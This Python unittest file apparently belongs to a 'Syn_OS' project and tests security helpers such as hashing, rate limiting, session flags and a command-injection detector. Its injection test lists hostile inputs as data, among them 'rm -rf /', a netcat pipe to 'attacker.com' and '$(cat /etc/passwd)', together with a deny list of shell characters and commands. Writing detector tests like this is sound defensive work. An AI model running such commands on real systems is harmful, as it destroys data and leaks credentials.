#!/usr/bin/env python3
"""
Security Comprehensive Test Suite
Extended security tests for vulnerability detection and prevention
"""

import unittest
import tempfile
import hashlib
import json
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock
import os
import secrets
import base64

class TestSecurityComprehensive(unittest.TestCase):
    """Comprehensive security functionality tests"""
    
    def setUp(self):
        """Set up test environment"""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.test_key = secrets.token_bytes(32)
    
    def tearDown(self):
        """Clean up test environment"""
        import shutil
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
    
    def test_hash_function_integrity(self):
        """Test cryptographic hash function integrity"""
        test_data = b"Syn_OS security test data"
        
        # Test SHA-256
        sha256_hash = hashlib.sha256(test_data).hexdigest()
        self.assertEqual(len(sha256_hash), 64)  # SHA-256 produces 64 hex chars
        
        # Test consistency
        sha256_hash2 = hashlib.sha256(test_data).hexdigest()
        self.assertEqual(sha256_hash, sha256_hash2)
        
        # Test different input produces different hash
        different_data = b"Different test data"
        different_hash = hashlib.sha256(different_data).hexdigest()
        self.assertNotEqual(sha256_hash, different_hash)
    
    def test_random_key_generation(self):
        """Test secure random key generation"""
        # Generate multiple keys
        keys = [secrets.token_bytes(32) for _ in range(10)]
        
        # All keys should be different
        for i in range(len(keys)):
            for j in range(i + 1, len(keys)):
                self.assertNotEqual(keys[i], keys[j])
        
        # All keys should have correct length
        for key in keys:
            self.assertEqual(len(key), 32)
    
    def test_secure_comparison(self):
        """Test secure string comparison"""
        def secure_compare(a, b):
            """Constant-time comparison to prevent timing attacks"""
            if len(a) != len(b):
                return False
            
            result = 0
            for x, y in zip(a, b):
                result |= ord(x) ^ ord(y)
            return result == 0
        
        # Test equal strings
        self.assertTrue(secure_compare("test123", "test123"))
        
        # Test different strings
        self.assertFalse(secure_compare("test123", "test124"))
        
        # Test different lengths
        self.assertFalse(secure_compare("test", "testing"))
    
    def test_advanced_vulnerability_detection(self):
        """Test advanced vulnerability detection"""
        def detect_command_injection(user_input):
            """Detect command injection attempts"""
            dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '{', '}']
            dangerous_commands = [' rm ', ' del ', ' shutdown ', ' reboot ', ' format ']
            
            # Check for dangerous characters
            for char in dangerous_chars:
                if char in user_input:
                    return True
            
            # Check for dangerous commands (with spaces to avoid false positives)
            user_input_spaced = f" {user_input.lower()} "
            for cmd in dangerous_commands:
                if cmd in user_input_spaced:
                    return True
            
            return False
        
        # Test safe inputs
        safe_inputs = ["normal_filename.txt", "user_data_123", "report.pdf"]
        for safe_input in safe_inputs:
            self.assertFalse(detect_command_injection(safe_input))
        
        # Test dangerous inputs
        dangerous_inputs = [
            "file.txt; rm -rf /",
            "data | nc attacker.com",
            "$(cat /etc/passwd)",
            "file && shutdown -h now"
        ]
        for dangerous_input in dangerous_inputs:
            self.assertTrue(detect_command_injection(dangerous_input))

class TestSecurityAdvancedProtection(unittest.TestCase):
    """Advanced security protection mechanisms"""
    
    def test_rate_limiting(self):
        """Test rate limiting implementation"""
        class RateLimiter:
            def __init__(self, max_requests=100, time_window=60):
                self.max_requests = max_requests
                self.time_window = time_window
                self.requests = {}
            
            def is_allowed(self, client_id, current_time):
                if client_id not in self.requests:
                    self.requests[client_id] = []
                
                # Remove old requests outside time window
                self.requests[client_id] = [
                    req_time for req_time in self.requests[client_id]
                    if current_time - req_time < self.time_window
                ]
                
                # Check if under limit
                if len(self.requests[client_id]) < self.max_requests:
                    self.requests[client_id].append(current_time)
                    return True
                
                return False
        
        # Test rate limiter
        rate_limiter = RateLimiter(max_requests=5, time_window=60)
        client_id = "test_client"
        current_time = 1641902400
        
        # First 5 requests should be allowed
        for i in range(5):
            self.assertTrue(rate_limiter.is_allowed(client_id, current_time + i))
        
        # 6th request should be denied
        self.assertFalse(rate_limiter.is_allowed(client_id, current_time + 5))
    
    def test_input_validation_comprehensive(self):
        """Test comprehensive input validation"""
        def validate_input(data, input_type):
            """Comprehensive input validation"""
            validations = {
                'email': lambda x: '@' in x and '.' in x and len(x) <= 254,
                'phone': lambda x: x.replace('-', '').replace(' ', '').isdigit(),
                'username': lambda x: x.isalnum() and 3 <= len(x) <= 20,
                'url': lambda x: x.startswith(('http://', 'https://')) and '.' in x,
                'ip_address': lambda x: all(
                    0 <= int(part) <= 255 for part in x.split('.') if part.isdigit()
                ) if x.count('.') == 3 else False
            }
            
            if input_type not in validations:
                return False
            
            try:
                return validations[input_type](data)
            except:
                return False
        
        # Test email validation
        self.assertTrue(validate_input("user@example.com", "email"))
        self.assertFalse(validate_input("invalid-email", "email"))
        
        # Test username validation
        self.assertTrue(validate_input("user123", "username"))
        self.assertFalse(validate_input("us", "username"))  # Too short
        
        # Test IP address validation
        self.assertTrue(validate_input("192.168.1.1", "ip_address"))
        self.assertFalse(validate_input("256.1.1.1", "ip_address"))  # Invalid range
    
    def test_session_security(self):
        """Test session security mechanisms"""
        def generate_secure_session():
            """Generate secure session with security features"""
            return {
                'session_id': secrets.token_urlsafe(32),
                'csrf_token': secrets.token_hex(16),
                'creation_time': 1641902400,
                'last_activity': 1641902400,
                'ip_address': '192.168.1.100',
                'user_agent_hash': hashlib.sha256(b"TestAgent/1.0").hexdigest(),
                'secure_flags': {
                    'httponly': True,
                    'secure': True,
                    'samesite': 'strict'
                }
            }
        
        def validate_session_security(session):
            """Validate session security properties"""
            required_fields = [
                'session_id', 'csrf_token', 'creation_time', 
                'ip_address', 'secure_flags'
            ]
            
            for field in required_fields:
                if field not in session:
                    return False
            
            # Validate secure flags
            flags = session['secure_flags']
            if not all([flags.get('httponly'), flags.get('secure')]):
                return False
            
            return True
        
        # Test session generation and validation
        session = generate_secure_session()
        self.assertTrue(validate_session_security(session))
        
        # Test session ID properties
        self.assertEqual(len(session['session_id']), 43)  # URL-safe base64
        self.assertEqual(len(session['csrf_token']), 32)  # 16 bytes = 32 hex chars

class TestSecurityCompliance(unittest.TestCase):
    """Security compliance and standards tests"""
    
    def test_gdpr_compliance_simulation(self):
        """Test GDPR compliance mechanisms"""
        def simulate_data_processing_consent():
            """Simulate GDPR consent management"""
            consent_record = {
                'user_id': 'user123',
                'consent_given': True,
                'consent_timestamp': '2025-01-11T10:00:00Z',
                'consent_version': '1.0',
                'purposes': ['necessary', 'analytics'],
                'withdrawal_allowed': True,
                'data_retention_period': 365,  # days
                'lawful_basis': 'consent'
            }
            return consent_record
        
        def validate_consent_record(consent):
            """Validate GDPR consent record"""
            required_fields = [
                'user_id', 'consent_given', 'consent_timestamp',
                'purposes', 'lawful_basis'
            ]
            
            for field in required_fields:
                if field not in consent:
                    return False
            
            # Validate specific requirements
            if not isinstance(consent['purposes'], list):
                return False
            
            if consent['lawful_basis'] not in ['consent', 'contract', 'legal_obligation']:
                return False
            
            return True
        
        # Test GDPR compliance
        consent = simulate_data_processing_consent()
        self.assertTrue(validate_consent_record(consent))
        self.assertTrue(consent['withdrawal_allowed'])
        self.assertIn('necessary', consent['purposes'])
    
    def test_security_standards_compliance(self):
        """Test compliance with security standards"""
        def check_owasp_top10_protections():
            """Check OWASP Top 10 protection measures"""
            protections = {
                'injection': {
                    'sql_injection_prevention': True,
                    'command_injection_prevention': True,
                    'ldap_injection_prevention': True
                },
                'broken_authentication': {
                    'multi_factor_auth': True,
                    'session_management': True,
                    'password_policy': True
                },
                'sensitive_data_exposure': {
                    'encryption_at_rest': True,
                    'encryption_in_transit': True,
                    'key_management': True
                },
                'xml_external_entities': {
                    'xml_parser_configured': True,
                    'external_entity_disabled': True
                },
                'broken_access_control': {
                    'authorization_checks': True,
                    'principle_of_least_privilege': True
                },
                'security_misconfiguration': {
                    'secure_defaults': True,
                    'regular_updates': True,
                    'error_handling': True
                },
                'xss': {
                    'input_validation': True,
                    'output_encoding': True,
                    'csp_headers': True
                },
                'insecure_deserialization': {
                    'input_validation': True,
                    'signature_verification': True
                },
                'vulnerable_components': {
                    'dependency_scanning': True,
                    'regular_updates': True
                },
                'insufficient_logging': {
                    'security_logging': True,
                    'log_monitoring': True,
                    'incident_response': True
                }
            }
            
            return protections
        
        # Test OWASP compliance
        protections = check_owasp_top10_protections()
        
        # Verify all major categories are covered
        self.assertIn('injection', protections)
        self.assertIn('broken_authentication', protections)
        self.assertIn('sensitive_data_exposure', protections)
        
        # Verify specific protections
        self.assertTrue(protections['injection']['sql_injection_prevention'])
        self.assertTrue(protections['xss']['input_validation'])
        self.assertTrue(protections['insufficient_logging']['security_logging'])

class TestSecurityIncidentResponse(unittest.TestCase):
    """Security incident response and monitoring tests"""
    
    def test_intrusion_detection_simulation(self):
        """Test intrusion detection simulation"""
        def detect_suspicious_activity(activity_log):
            """Detect suspicious activity patterns"""
            suspicious_indicators = []
            
            # Check for multiple failed logins
            failed_logins = [entry for entry in activity_log if entry['action'] == 'login_failed']
            if len(failed_logins) > 5:
                suspicious_indicators.append('multiple_failed_logins')
            
            # Check for unusual access patterns
            access_times = [entry['timestamp'] for entry in activity_log if entry['action'] == 'access']
            if len(set(access_times)) > 10:  # Too many different access times
                suspicious_indicators.append('unusual_access_pattern')
            
            # Check for privilege escalation attempts
            privilege_attempts = [entry for entry in activity_log if 'admin' in entry.get('resource', '')]
            if len(privilege_attempts) > 2:
                suspicious_indicators.append('privilege_escalation_attempt')
            
            return suspicious_indicators
        
        # Test with suspicious activity
        suspicious_log = [
            {'action': 'login_failed', 'timestamp': i, 'ip': '192.168.1.100'}
            for i in range(10)
        ] + [
            {'action': 'access', 'timestamp': i, 'resource': '/admin/users'}
            for i in range(5)
        ]
        
        indicators = detect_suspicious_activity(suspicious_log)
        self.assertIn('multiple_failed_logins', indicators)
        self.assertIn('privilege_escalation_attempt', indicators)
    
    def test_security_alert_system(self):
        """Test security alert system"""
        def generate_security_alert(severity, category, description, context):
            """Generate security alert"""
            alert = {
                'alert_id': secrets.token_hex(8),
                'timestamp': '2025-01-11T10:00:00Z',
                'severity': severity,
                'category': category,
                'description': description,
                'context': context,
                'status': 'open',
                'assigned_to': None,
                'escalation_level': 1 if severity == 'LOW' else 2 if severity == 'MEDIUM' else 3
            }
            
            return alert
        
        def prioritize_alerts(alerts):
            """Prioritize alerts by severity and category"""
            priority_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
            return sorted(alerts, key=lambda x: priority_order.get(x['severity'], 0), reverse=True)
        
        # Test alert generation and prioritization
        alerts = [
            generate_security_alert('LOW', 'access', 'Normal access', {}),
            generate_security_alert('CRITICAL', 'intrusion', 'Potential breach', {'ip': '192.168.1.100'}),
            generate_security_alert('MEDIUM', 'authentication', 'Failed login attempts', {})
        ]
        
        prioritized = prioritize_alerts(alerts)
        
        # Critical alert should be first
        self.assertEqual(prioritized[0]['severity'], 'CRITICAL')
        self.assertEqual(prioritized[0]['category'], 'intrusion')
        
        # Check alert structure
        for alert in alerts:
            self.assertIn('alert_id', alert)
            self.assertIn('severity', alert)
            self.assertEqual(len(alert['alert_id']), 16)  # 8 bytes = 16 hex chars

def run_security_comprehensive_tests():
    """Run all comprehensive security tests"""
    test_suite = unittest.TestSuite()
    
    # Add test classes
    test_classes = [
        TestSecurityComprehensive,
        TestSecurityAdvancedProtection,
        TestSecurityCompliance,
        TestSecurityIncidentResponse
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    return result.wasSuccessful()

if __name__ == "__main__":
    success = run_security_comprehensive_tests()
    sys.exit(0 if success else 1)
